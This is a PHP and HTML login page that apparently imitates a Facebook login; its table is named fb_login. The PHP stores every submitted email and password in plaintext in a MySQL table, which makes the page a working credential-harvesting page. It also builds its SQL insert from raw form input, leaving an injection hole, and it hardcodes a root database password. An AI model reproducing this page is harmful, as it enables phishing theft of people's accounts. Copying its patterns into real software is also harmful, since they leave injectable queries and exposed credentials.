<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #f2f2f2;
        }

        .con {
            position: relative;
            width: 400px;
            height: 400px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, .1);
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .con form {
            width: 100%;
            padding: 30px;
        }

        .con form h2 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }

        .con form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .con form input[type="submit"] {
            background: #007BFF;
            color: #fff;
            border: none;
            cursor: pointer;
            font-size: 18px;
            transition: background 0.3s ease;
            font-weight: 800;
        }

        .con form input[type="submit"]:hover {
            background: #0056b3;
        }

        .con form span {
            display: block;
            text-align: center;
            margin-top: 10px;
            color: #666;
        }

        .con form hr {
            border: none;
            border-top: 1px solid #ccc;
            margin-top: 10px;
        }

        .con form .create {
            text-align: center;
            margin-top: 10px;
        }

        .con form .create button {
            padding: 10px 20px;
            border: none;
            background: #28a745;
            color: #fff;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s ease;
            font-weight: 700;
        }

        .con form .create button:hover {
            background: #218838;
        }

        .forget {
            color: #0044ff;
            cursor: pointer;
        }

        .forget:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="con">
        <form action="#" method="post">
            <h2>Login</h2>
            <input type="text" placeholder="Email" name="user" id="">
            <input type="text" placeholder="Password" name="pass" id="">
            <input type="submit" value="Log in" name="submit">
            <span class="forget" style=" color: #0044ff; cursor: pointer;">Forgotten password?</span>
            <hr>
            <br>
            <div class="create">
                <button>Create new account</button>
         
    



<?php
function rand_str($length = 10) {   
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $str = "";  
    for ($i = 0; $i < $length; $i++) {  
        $str .= $chars[mt_rand(0, strlen($chars) - 1)];  
    }  
    return $str;
}

    $conn = mysqli_connect("localhost:3306","root","emperor3745","testing");
    if(!$conn) {
        echo "Connection Failed: ".mysqli_connect_error();
        exit();
    }
$sql = "create table fb_login( si_no int primary key auto_increment, User_name varchar(40), Pass varchar(40));";
try {mysqli_query($conn,$sql);
    echo "Table Created";

} catch (Exception $e) {  }






if(isset($_POST['submit'])) {
 $user = $_POST['user'];
    $pass = $_POST['pass'];
    $sql = "insert into fb_login(User_name, Pass) values('$user', '$pass');";
    $rel = mysqli_query($conn, $sql);
    if($rel) {
        echo "                <br>
                <br>
                <div style='color: #218838; '> congratulations </div>";
    } else {
        echo "Data Not Inserted";
}
}
 

?>
   </div>

        </form>
</div>
</body>
</html>